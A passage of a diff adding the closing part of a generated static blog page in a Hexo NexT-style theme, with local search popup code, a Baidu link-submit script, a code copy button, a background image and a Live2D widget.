+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+      }
+      else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
